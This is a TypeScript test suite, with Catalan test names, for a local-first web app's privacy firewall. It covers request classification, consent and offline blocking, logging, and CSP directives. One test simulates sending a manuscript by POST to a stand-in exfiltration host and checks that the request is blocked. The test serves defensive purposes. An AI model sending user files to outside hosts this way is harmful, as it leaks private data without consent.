import assert from "node:assert/strict";
import test from "node:test";

import {
  classifyDestination,
  createPrivacyFirewall,
  evaluateRequest,
  FirewallBlockedError,
  LOCAL_FIRST_CSP,
  NETWORK_INVENTORY,
} from "../lib/privacy-firewall.ts";

const APP_ORIGIN = "https://validaccio.example";

test("l'inventari declarat només conté destinacions locals sense dades", () => {
  assert.ok(NETWORK_INVENTORY.length > 0);
  for (const entry of NETWORK_INVENTORY) {
    assert.equal(entry.destination, "local");
    assert.equal(entry.carriesUserData, false);
  }
});

test("classifica correctament l'origen de cada petició", () => {
  assert.equal(classifyDestination(`${APP_ORIGIN}/app.js`, APP_ORIGIN), "local");
  assert.equal(classifyDestination("/sw.js", APP_ORIGIN), "local");
  assert.equal(classifyDestination("data:text/plain,hola", APP_ORIGIN), "data");
  assert.equal(classifyDestination("blob:https://x/y", APP_ORIGIN), "blob");
  assert.equal(
    classifyDestination("https://tercers.example/upload", APP_ORIGIN),
    "external",
  );
});

test("permet el mateix origen i els recursos locals", () => {
  for (const url of [`${APP_ORIGIN}/x`, "/sw.js", "data:,a", "blob:https://x/y"]) {
    assert.equal(evaluateRequest({ url, appOrigin: APP_ORIGIN, offline: false }).allowed, true);
  }
});

test("bloqueja una destinació externa sense consentiment", () => {
  const decision = evaluateRequest({
    url: "https://tercers.example/upload",
    appOrigin: APP_ORIGIN,
    offline: false,
  });
  assert.equal(decision.allowed, false);
  assert.equal(decision.category, "external");
  assert.equal(decision.host, "tercers.example");
});

test("permet una destinació externa amb consentiment previ, però no offline", () => {
  assert.equal(
    evaluateRequest({
      url: "https://api.example/v1",
      appOrigin: APP_ORIGIN,
      offline: false,
      consentedHosts: ["api.example"],
    }).allowed,
    true,
  );
  // El mode sense xarxa preval sobre el consentiment.
  assert.equal(
    evaluateRequest({
      url: "https://api.example/v1",
      appOrigin: APP_ORIGIN,
      offline: true,
      consentedHosts: ["api.example"],
    }).allowed,
    false,
  );
});

test("el guard deixa passar el mateix origen cap al fetch base", async () => {
  const calls: string[] = [];
  const firewall = createPrivacyFirewall({
    appOrigin: APP_ORIGIN,
    baseFetch: (async (input) => {
      calls.push(String(input));
      return new Response("ok");
    }) as typeof fetch,
  });

  await firewall.fetch(`${APP_ORIGIN}/dades`);
  assert.deepEqual(calls, [`${APP_ORIGIN}/dades`]);
  assert.equal(firewall.getLog().length, 0); // el local no es registra
});

test("PROVA: un intent d'enviar un fitxer fora del dispositiu queda bloquejat", async () => {
  let baseFetchCalled = false;
  const firewall = createPrivacyFirewall({
    appOrigin: APP_ORIGIN,
    baseFetch: (async () => {
      baseFetchCalled = true;
      return new Response("ok");
    }) as typeof fetch,
    now: () => "2026-07-22T15:00:00.000Z",
  });

  await assert.rejects(
    firewall.fetch("https://exfiltra.example/rebre", {
      method: "POST",
      body: "contingut del manuscrit",
    }),
    (error: unknown) =>
      error instanceof FirewallBlockedError &&
      error.url === "https://exfiltra.example/rebre",
  );

  assert.equal(baseFetchCalled, false, "el fetch base no s'ha d'invocar mai");
  const log = firewall.getLog();
  assert.equal(log.length, 1);
  assert.equal(log[0].allowed, false);
  assert.equal(log[0].host, "exfiltra.example");
});

test("el consentiment i el mode offline es poden canviar en temps d'execució", async () => {
  const firewall = createPrivacyFirewall({
    appOrigin: APP_ORIGIN,
    baseFetch: (async () => new Response("ok")) as typeof fetch,
  });

  firewall.allowHost("api.example");
  assert.deepEqual(firewall.getConsentedHosts(), ["api.example"]);
  await firewall.fetch("https://api.example/v1"); // permès

  firewall.setOffline(true);
  assert.equal(firewall.isOffline(), true);
  await assert.rejects(firewall.fetch("https://api.example/v1")); // ara bloquejat

  firewall.revokeHost("api.example");
  assert.deepEqual(firewall.getConsentedHosts(), []);
});


test("la CSP tanca els canals externs que no passen per fetch", () => {
  for (const directive of [
    "connect-src 'self'",
    "form-action 'self'",
    "img-src 'self' blob: data:",
    "media-src 'self' blob:",
    "object-src 'none'",
    "worker-src 'self' blob:",
  ]) {
    assert.ok(
      LOCAL_FIRST_CSP.includes(directive),
      `falta la directiva CSP: ${directive}`,
    );
  }
  assert.equal(LOCAL_FIRST_CSP.includes("https:"), false);
  assert.equal(LOCAL_FIRST_CSP.includes("*"), false);
});
